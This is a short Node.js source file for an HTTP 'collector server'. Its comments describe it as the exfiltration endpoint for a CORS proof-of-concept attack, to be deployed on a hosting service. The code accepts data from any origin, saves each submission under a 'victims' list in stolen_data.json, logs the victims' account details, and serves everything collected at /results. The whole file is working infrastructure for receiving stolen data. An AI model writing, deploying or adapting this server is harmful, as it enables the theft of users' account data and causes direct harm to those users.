// Collector server — receives stolen data from CORS PoC
// Deploy on Vercel/Railway/Heroku as your exfil endpoint

const http = require('http');
const fs = require('fs');

const RESULTS_FILE = './stolen_data.json';

// Initialize results file
if (!fs.existsSync(RESULTS_FILE)) {
  fs.writeFileSync(RESULTS_FILE, JSON.stringify({ victims: [] }, null, 2));
}

const server = http.createServer((req, res) => {
  // CORS headers to accept from anywhere
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  // Receive stolen data
  if (req.method === 'POST' && req.url === '/collect') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      try {
        const data = JSON.parse(body);
        const results = JSON.parse(fs.readFileSync(RESULTS_FILE));
        results.victims.push({
          timestamp: new Date().toISOString(),
          ...data
        });
        fs.writeFileSync(RESULTS_FILE, JSON.stringify(results, null, 2));

        console.log(`[${new Date().toISOString()}] Data received from victim`);
        console.log(`  Calls: ${data.calls?.length || 0}`);
        console.log(`  Account: ${JSON.stringify(data.account || {})}`);

        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end('{"status":"ok"}');
      } catch (e) {
        res.writeHead(400);
        res.end('{"error":"bad json"}');
      }
    });
    return;
  }

  // View results
  if (req.method === 'GET' && req.url === '/results') {
    const results = JSON.parse(fs.readFileSync(RESULTS_FILE));
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(results, null, 2));
    return;
  }

  res.writeHead(404);
  res.end('not found');
});

server.listen(process.env.PORT || 3000, () => {
  console.log(`Collector running on port ${process.env.PORT || 3000}`);
});
